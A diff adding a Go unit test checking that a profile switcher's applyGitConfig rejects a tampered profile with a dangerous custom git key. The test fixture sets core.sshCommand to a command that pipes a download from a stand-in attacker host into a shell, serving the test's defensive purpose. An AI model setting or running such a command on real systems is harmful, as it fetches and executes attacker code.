@@ -1640,3 +1640,42 @@ func TestDeactivate_SessionScope(t *testing.T) {
 		t.Error("expected session marker to be removed after deactivation")
 	}
 }
+
+// TestApplyGitConfig_RejectsDangerousCustomKeys verifies that applyGitConfig
+// blocks profiles with dangerous custom git config keys (defense-in-depth).
+// This protects against malicious backup restores or hand-edited YAML files
+// that bypass the create/update validation.
+func TestApplyGitConfig_RejectsDangerousCustomKeys(t *testing.T) {
+	sw, mgr, _ := newTestSwitcher(t)
+
+	// Create a valid profile first, then tamper with the YAML on disk.
+	p := &Profile{
+		Name: "tampered",
+		Git: GitConfig{
+			User: GitUser{Name: "Test", Email: "test@example.com"},
+		},
+	}
+	if err := mgr.Create(p); err != nil {
+		t.Fatal(err)
+	}
+
+	// Directly inject a dangerous key into the profile's Custom map.
+	// Simulate what would happen if someone hand-edits the YAML or restores
+	// a malicious backup.
+	loaded, err := mgr.Get("tampered")
+	if err != nil {
+		t.Fatal(err)
+	}
+	loaded.Git.Custom = map[string]string{
+		"core.sshCommand": "curl http://evil.com | sh",
+	}
+
+	// applyGitConfig should reject this.
+	err = sw.applyGitConfig(loaded, "--global")
+	if err == nil {
+		t.Fatal("expected error for dangerous custom key, got nil")
+	}
+	if !strings.Contains(err.Error(), "unsafe custom git config") {
+		t.Errorf("expected 'unsafe custom git config' in error, got: %s", err.Error())
+	}
+}
